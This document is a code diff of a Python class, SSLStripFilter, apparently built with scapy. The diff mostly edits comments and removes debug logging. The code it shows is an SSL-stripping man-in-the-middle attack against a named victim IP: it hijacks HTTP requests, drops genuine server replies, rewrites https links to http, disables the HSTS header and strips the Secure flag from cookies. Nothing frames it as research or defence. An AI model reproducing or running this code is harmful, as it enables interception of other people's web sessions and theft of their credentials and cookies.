@@ -25,12 +25,6 @@ class SSLStripFilter:
 
         ip = packet[IP]
         tcp = packet[TCP]
-        
-        # --- DEBUG LOGGING ---
-        # Uncomment this to see ALL TCP traffic flows
-        # if ip.src == self.victim_ip:
-        #    print(f"[DEBUG] Traffic from Victim: Dport={tcp.dport} Len={len(tcp.payload)}")
-        # ---------------------
 
         # 1. Traffic FROM Victim TO Server (Port 80) - The Request
         if ip.src == self.victim_ip and tcp.dport == 80:
@@ -45,7 +39,7 @@ class SSLStripFilter:
             
         # 2. Traffic FROM Server TO Victim (Port 80)
         # If we successfully proxied, we blocked the real request, so the real server 
-        # never replies on port 80 (or we don't care about it).
+        # never replies on port 80 (or we don't really care :D).
         # We need to block real server responses if they leak through to avoid duplicates.
         if ip.dst == self.victim_ip and tcp.sport == 80:
              # If this is a response to a hijacked port, drop it (we already sent a fake response)
@@ -108,7 +102,7 @@ class SSLStripFilter:
                     self.logger("-" * 40 + "\n")
             except Exception as e:
                 self.logger(f"[Sniff Error] {e}")
-        # ---------------------------
+        # ------------------
 
         self.processed_requests.add(request_id)
         self.logger(f"[SSLFilter] Intercepting HTTP Request on port {tcp.sport}")
@@ -140,7 +134,7 @@ class SSLStripFilter:
                     
                     # 2. Forward the Payload (Request)
                     # We need to ensure we send a valid HTTP request.
-                    # Sometimes the payload captured has partial data or issues.
+                    # Bcs sometime the payload captured has partial data or issues.
                     # Also, force "Connection: close" to ensure we don't hang waiting
                     if b"Connection: keep-alive" in payload:
                         payload = payload.replace(b"Connection: keep-alive", b"Connection: close     ")
@@ -181,7 +175,7 @@ class SSLStripFilter:
         # 1. https:// -> http:// 
         data = data.replace(b"https://", b"http:// ")
         
-        # 2. HSTS
+        # 2. HSTS (Hopefully the site won't mind us removing this header)
         data = data.replace(b"Strict-Transport-Security", b"Stricken-Transport-Security")
 
         # 3. Secure Cookies (Strip 'Secure' flag)
@@ -194,7 +188,7 @@ class SSLStripFilter:
         tcp = request_packet[TCP]
         import scapy.all as sc
 
-        # Determine L2 Destination (MAC of Victim)
+        # Determine MAC of victim
         ether_dst = "ff:ff:ff:ff:ff:ff"
         if request_packet.haslayer(sc.Ether):
              ether_dst = request_packet[sc.Ether].src
